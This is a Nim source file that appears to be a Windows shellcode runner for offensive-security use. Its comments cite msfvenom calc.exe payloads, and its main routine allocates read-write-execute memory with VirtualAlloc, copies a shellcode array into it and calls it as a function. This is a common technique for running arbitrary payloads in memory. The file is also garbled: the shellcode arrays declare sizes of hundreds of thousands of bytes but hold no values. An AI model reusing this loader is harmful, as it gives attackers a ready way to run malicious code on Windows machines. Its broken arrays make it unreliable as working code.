import winim

when defined(windows):
    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # msfvenom -p windows/exec -f csharp CMD="calc.exe" modified for Nim arrays
        echo "[*] Running in x86 process"
        var shellcode: array[662623, byte] = [
        byte 
        ]
    elif defined(amd64):
        # msfvenom -p windows/x64/exec -f csharp CMD="calc.exe" modified for Nim arrays
        echo "[*] Running in x64 process"
        var shellcode: array[744524, byte] = [
        byte 
        ]


proc main() = 
  let tProcess = GetCurrentProcessId()

  echo "[*] Target Process: ", tProcess
  # Allocate memory
  let rPtr = VirtualAlloc(
      nil,
      cast[SIZE_T](shellcode.len),
      MEM_COMMIT,
      PAGE_EXECUTE_READ_WRITE
  )
  copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))
  let a = cast[proc(){.nimcall.}](rPtr)
  a()

when isMainModule:
  main()
